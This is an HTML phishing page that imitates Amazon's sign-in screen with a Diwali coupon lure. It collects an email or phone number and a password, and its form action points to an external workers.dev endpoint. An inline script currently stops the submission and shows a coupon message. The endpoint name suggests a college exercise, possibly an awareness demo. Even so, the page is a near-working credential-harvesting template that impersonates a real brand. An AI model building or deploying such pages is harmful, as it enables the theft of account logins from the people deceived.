<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Amazon-Diwali</title>
</head>
<body>
    <div class="main">
        <img src="logo.png">
        <div class="cont">
            <div class="box">
                <h1>Sign in</h1>
                <form id="loginForm" action="https://amazon-college-extension-activity.bradithya614.workers.dev/" method="POST">
                    <label>Email or mobile phone number</label>
                    <input type="text" name="user" required>
                    <label>Password <span class="split">Forgot Password</span></label>
                    <input type="password" name="pass" required>
                    <input type="submit" value="Sign in">
                </form>
                <p>By continuing, you agree to Amazon's <span class="col_blue">Conditions of Use</span> and <span class="col_blue">Privacy Notice</span>.</p>
            </div>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); 
            alert('You will receive your coupon soon.'); 
        });
    </script>
</body>
</html>
